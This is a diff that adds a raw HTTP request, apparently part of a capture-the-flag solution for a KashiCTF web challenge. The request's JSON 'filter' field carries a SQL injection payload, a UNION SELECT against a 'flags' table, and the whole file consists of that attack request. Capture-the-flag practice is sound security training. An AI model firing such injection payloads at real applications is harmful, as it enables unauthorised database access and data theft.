@@ -1,0 +1,15 @@
+POST /api/list-v2 HTTP/1.1
+Host: kashictf.iitbhucybersec.in:62161
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://kashictf.iitbhucybersec.in:53299/v2-testing
+Content-Type: application/json
+Content-Length: 61
+Origin: http://kashictf.iitbhucybersec.in:53299
+Connection: keep-alive
+Priority: u=0
+
+{"filter": "' UNION SELECT rowId,1,1,1,1,1 FROM flags; --"}
+
